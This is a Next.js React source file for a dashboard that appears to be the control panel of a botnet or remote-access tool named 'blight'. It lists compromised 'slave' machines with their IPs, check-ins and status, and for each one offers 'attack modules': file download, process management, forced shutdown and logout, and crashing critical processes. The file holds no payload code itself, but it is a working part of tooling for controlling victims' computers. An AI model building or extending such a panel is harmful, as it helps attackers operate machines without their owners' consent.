import Link from "next/link";
import React, { useState, useEffect } from "react";

interface SlaveData {
  freq: number;
  slaveIP: string;
  slaveLastCheckin: string;
  slaveName: string;
  slavePing: string;
  slaveStatus: string;
}
export function MachineTableItem({ slave }: { slave: SlaveData }) {
    return (
        <div className="grid grid-cols-5 gap-4 text-left py-2 hover:text-lime-500">
        <span>{slave.slaveName}</span>
        <span>{slave.slaveIP}</span>
        <span>{slave.slaveLastCheckin}</span>
        <span>{slave.slavePing}</span>
        <span
            className={`font-semibold ${
            slave.slaveStatus === "online" ? "text-green-500" : "text-red-500"
            }`}
        >
            {slave.slaveStatus}
        </span>
        </div>
    );
}

export function ModuleItem({ title, link }: { title: string; link: string }) {
    return (
        <div className="mt-1 p-2 bg-neutral-800 rounded-lg text-white hover:text-lime-500">
        <Link href={link} >
            {title}
        </Link>
        </div>
    );
}

export function AttackModules({ slave }: { slave: SlaveData }) {
    return (
        <div className="mt-2 rounded-lg text-white">
            <ModuleItem title="Download Manager" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=download_file`} />
            <ModuleItem title="Process Manager" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=process_manager`} />
            <ModuleItem title="Force Shutdown" link="#" />
            <ModuleItem title="Force Logout" link="#" />
            <ModuleItem title="Force Crash Non-Critical Processes" link="#" />
            <ModuleItem title="Force Crash Critical Processes" link="#" />
        </div>
    );
}

export function Machine({ slave }: { slave: SlaveData }) {
    const [isExpanded, setIsExpanded] = useState(false);
    const [isSelected, setIsSelected] = useState(false);
        
    return (
      <div className="cursor-pointer rounded-lg hover:bg-neutral-900 p-2 transition-all duration-300">
        <div className="flex items-center" onClick={() => setIsExpanded(!isExpanded)} >
          <img src="machine.svg" alt="Slave Image" className="w-8 h-8" />
          <span className={`ml-3 flex-1 text-left ${slave.slaveStatus === "online" ? "text-green-500 font-semibold" : "text-red-500"}`}>
            {slave.slaveName}
          </span>
        </div>
  
        <div className={`overflow-hidden transition-all duration-300 ${isExpanded ? "max-h-50 opacity-100" : "max-h-0 opacity-0"}`}>
            <div className="mt-2 p-2 bg-neutral-800 rounded-lg text-white">
                <p><strong>IP:</strong> {slave.slaveIP}</p>
                <p><strong>Last Check-in:</strong> {slave.slaveLastCheckin}</p>
                <p><strong>Ping:</strong> {slave.slavePing}</p>
                <p><strong>Status:</strong> <span className={slave.slaveStatus === "online" ? "text-green-400" : "text-red-400"}>{slave.slaveStatus}</span></p>
                
                <div onClick={() => { setIsSelected(!isSelected); setIsExpanded(!isExpanded);  }} className="text-blue-400 underline mt-2 inline-block">
                {isSelected ? "Hide" : "Show Attack Modules"}
                </div>
                
            </div>
          </div>
          <div className={`overflow-hidden transition-all duration-300 ${ isSelected ? "max-h-50 opacity-100" : "max-h-0 opacity-0" }`}>
                <AttackModules slave={slave} />
                </div>
        </div>
    );
  }
  

export default function SlaveStatistics() {
  const [slaves, setSlaves] = useState<SlaveData[]>([]);
  const [error, setError] = useState<string | null>(null);
  const sortedSlaves = [...slaves].sort((a, b) => {
    return a.slaveStatus === "online" ? -1 : 1;
  });
  
  const fetchSlaves = async () => {
    try {
      const response = await fetch("/api/fetch-slaves");
      const jsonData = await response.json();
      console.log("API Response:", jsonData);

      if (jsonData && Array.isArray(jsonData.slaves)) {
        setSlaves(jsonData.slaves);
      } else {
        throw new Error("Invalid response format");
      }
    } catch (error: any) {
      console.error("Fetch Error:", error.message);
      setError(error.message);
    }
  };

  useEffect(() => {
    fetchSlaves();
  }, []);

  return (
    <div className="p-4 w-full">
  {error ? (
    <p className="text-red-500">Error: {error}</p>
  ) : (
    <div className="w-full grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-8 py-2">
      {sortedSlaves.map((slave, index) => (
        <Machine key={index} slave={slave} />
        
      ))}
    </div>
  )}
</div>

  );
}
